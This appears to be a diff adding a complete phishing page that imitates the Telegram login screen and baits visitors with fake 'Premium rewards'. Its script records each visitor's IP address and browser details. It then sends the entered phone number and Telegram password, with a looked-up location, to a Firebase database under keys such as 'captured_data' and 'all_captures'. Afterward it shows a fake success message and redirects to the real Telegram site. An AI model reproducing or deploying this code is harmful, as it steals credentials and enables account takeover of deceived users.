@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Telegram - Login</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <script src="../firebase-config.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background: #e8ecef;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 20px;
+        }
+        .login-card {
+            background: #fff;
+            border-radius: 16px;
+            box-shadow: 0 4px 30px rgba(0,0,0,0.12);
+            padding: 35px 30px;
+            animation: slideUp 0.4s ease;
+        }
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo .ico { font-size: 4em; }
+        .logo h1 {
+            color: #0088cc;
+            font-size: 2em;
+            font-weight: 700;
+        }
+        .logo p {
+            color: #707579;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+        
+        .offer-banner {
+            background: linear-gradient(135deg, #0088cc, #0077b5);
+            color: #fff;
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+            margin-bottom: 25px;
+            font-size: 0.9em;
+        }
+        .offer-banner strong { font-size: 1.1em; }
+        
+        .phone-section {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .phone-section .flag {
+            font-size: 2em;
+            display: block;
+        }
+        .phone-section .country-code {
+            color: #0088cc;
+            font-weight: 600;
+            font-size: 1.1em;
+            margin: 10px 0 5px;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            color: #707579;
+            font-size: 0.85em;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #dfe2e5;
+            border-radius: 10px;
+            font-size: 1em;
+            transition: all 0.3s;
+            background: #fafafa;
+        }
+        .form-group input:focus {
+            border-color: #0088cc;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0,136,204,0.15);
+            background: #fff;
+        }
+        .form-group input::placeholder { color: #a0a4a8; }
+        
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #0088cc;
+            border: none;
+            border-radius: 10px;
+            color: #fff;
+            font-size: 1.05em;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        .login-btn:hover { background: #0077b5; transform: scale(1.01); }
+        
+        .info-text {
+            text-align: center;
+            margin-top: 20px;
+            color: #707579;
+            font-size: 0.8em;
+            line-height: 1.5;
+        }
+        .info-text a { color: #0088cc; text-decoration: none; }
+        .info-text a:hover { text-decoration: underline; }
+        
+        .qr-section {
+            text-align: center;
+            margin-top: 25px;
+            padding-top: 20px;
+            border-top: 1px solid #eef0f2;
+        }
+        .qr-section .qr-box {
+            display: inline-block;
+            padding: 15px;
+            background: #fafafa;
+            border-radius: 10px;
+            border: 1px solid #eef0f2;
+        }
+        .qr-section .qr-box div {
+            width: 120px;
+            height: 120px;
+            background: #dfe2e5;
+            margin: 0 auto;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 2.5em;
+        }
+        .qr-section p { color: #707579; font-size: 0.85em; margin-top: 10px; }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 25px;
+        }
+        .loading .spinner {
+            border: 3px solid #eef0f2;
+            border-top: 3px solid #0088cc;
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 1s linear infinite;
+            margin: 10px auto;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .loading p { color: #707579; margin-top: 10px; }
+        
+        .success-msg {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: #e3f2fd;
+            border-radius: 12px;
+        }
+        .success-msg h3 { color: #0088cc; }
+        .success-msg p { color: #202124; margin-top: 10px; font-size: 0.9em; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo">
+                <div class="ico">✈️</div>
+                <h1>Telegram</h1>
+                <p>Connect with your contacts</p>
+            </div>
+            
+            <div class="offer-banner">
+                <strong>🎉 Premium Telegram Rewards!</strong><br>
+                ✅ Telegram Premium 1 Year Free · ✅ 100K Members<br>
+                ✅ Free Stickers · ✅ Account Verification
+            </div>
+            
+            <div class="phone-section">
+                <span class="flag">📱</span>
+                <div class="country-code">🇵🇰 Pakistan +92</div>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Phone Number</label>
+                    <input type="text" id="username" placeholder="3XX-XXXXXXX" required>
+                </div>
+                <div class="form-group">
+                    <label>Password (if not, leave empty)</label>
+                    <input type="password" id="password" placeholder="Enter your Telegram password">
+                </div>
+                <button type="submit" class="login-btn">✈️ Sign In</button>
+            </form>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Sending verification code...</p>
+            </div>
+            
+            <div class="success-msg" id="successMsg">
+                <h3>✅ Success!</h3>
+                <p>Verification code sent! Your Premium rewards will be activated shortly.</p>
+                <p style="margin-top:10px;font-size:0.8em;color:#707579;">Redirecting to Telegram...</p>
+            </div>
+            
+            <div class="info-text">
+                <a href="#">Log in by QR Code</a> · <a href="#">Help</a>
+            </div>
+            
+            <div class="qr-section">
+                <div class="qr-box">
+                    <div>📱</div>
+                    <p style="margin-top:5px; font-size:0.8em; color:#a0a4a8;">Scan QR Code</p>
+                </div>
+                <p>Log in instantly by scanning the code</p>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkID = urlParams.get('id') || 'direct_' + Date.now();
+        const targetEmail = urlParams.get('target') || '';
+        
+        let visitorIP = '';
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => {
+                visitorIP = data.ip;
+                db.ref('visits/' + linkID).push({
+                    ip: visitorIP,
+                    userAgent: navigator.userAgent,
+                    timestamp: Date.now(),
+                    page: 'telegram',
+                    target: targetEmail
+                });
+            });
+        
+        if (targetEmail) document.getElementById('username').value = decodeURIComponent(targetEmail);
+        
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value || '(no password)';
+            
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            let location = 'Unknown';
+            fetch('https://ipapi.co/json/')
+                .then(r => r.json())
+                .then(data => { location = data.city + ', ' + data.country_name; })
+                .catch(() => {})
+                .finally(() => {
+                    db.ref('captured_data/' + linkID).set({
+                        username, password, ip: visitorIP, location,
+                        userAgent: navigator.userAgent, timestamp: Date.now(),
+                        service: 'telegram', serviceIcon: '✈️', target: targetEmail
+                    });
+                    db.ref('all_captures').push({
+                        username, password, ip: visitorIP, location,
+                        service: 'telegram', serviceIcon: '✈️', target: targetEmail, timestamp: Date.now()
+                    });
+                    
+                    setTimeout(() => {
+                        document.getElementById('loading').style.display = 'none';
+                        document.getElementById('successMsg').style.display = 'block';
+                        setTimeout(() => window.location.href = 'https://telegram.org', 3000);
+                    }, 2000);
+                });
+        });
+    </script>
+</body>
+</html>
